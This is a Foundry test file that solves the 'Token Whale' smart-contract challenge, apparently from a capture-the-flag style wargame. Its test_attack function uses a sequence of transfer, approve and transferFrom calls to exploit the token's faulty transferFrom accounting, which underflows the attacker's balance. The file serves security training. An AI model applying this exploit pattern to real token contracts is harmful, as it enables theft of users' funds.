// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {DeployTokenWhaleChallenge} from "../script/DeployTokenWhaleChallenge.s.sol";
import {TokenWhaleChallenge} from "../src/TokenWhaleChallenge.sol";

contract TestTokenWhaleChallenge is Test {
    address public immutable ATTACKER = makeAddr("attacker");
    address public immutable USER = makeAddr("user");
    TokenWhaleChallenge public token;

    function setUp() public {
        DeployTokenWhaleChallenge deploy = new DeployTokenWhaleChallenge();
        token = deploy.run();
    }

    function test_attack() public {
        vm.prank(ATTACKER);
        token.transfer(USER, 510);
        vm.prank(USER);
        token.approve(ATTACKER, 1000);
        vm.prank(ATTACKER);
        token.transferFrom(USER, USER, 500);
        assertEq(token.isComplete(), true);
    }
}
